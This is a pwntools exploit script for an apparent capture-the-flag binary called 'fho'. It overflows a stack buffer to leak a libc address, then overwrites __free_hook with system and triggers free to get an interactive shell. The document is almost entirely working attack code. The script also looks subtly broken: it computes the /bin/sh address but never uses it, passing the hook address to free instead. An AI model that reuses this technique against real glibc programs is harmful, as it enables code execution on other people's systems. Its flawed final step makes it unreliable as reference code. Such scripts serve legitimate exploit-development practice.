from pwn import *

port = 0
# rem = remote("", port)
rem = process("./fho/problem/fho")
elf = ELF("./fho/problem/fho")
lib = ELF("./fho/problem/libc-2.27.so")

payload = b'A' * 0x48
rem.sendafter(b'Buf: ', payload)

rem.recvuntil(payload)
libcMain243_addr = u64(rem.recvn(6) + b'\x00' * 0x2)
libcMain243_offset = lib.symbols['__libc_start_main'] + 243
lib_base = libcMain243_addr - libcMain243_offset
hook_addr = lib_base + lib.symbols['__free_hook']
sys_addr = lib_base + lib.symbols['system']
binsh_addr = lib_base + list(lib.search('/bin/sh'))[0]

rem.sendlineafter(b'write: ', str(hook_addr).encode())
rem.sendlineafter(b'With: ', str(sys_addr).encode())
rem.sendlineafter(b'free: ', str(hook_addr).encode())

rem.interactive()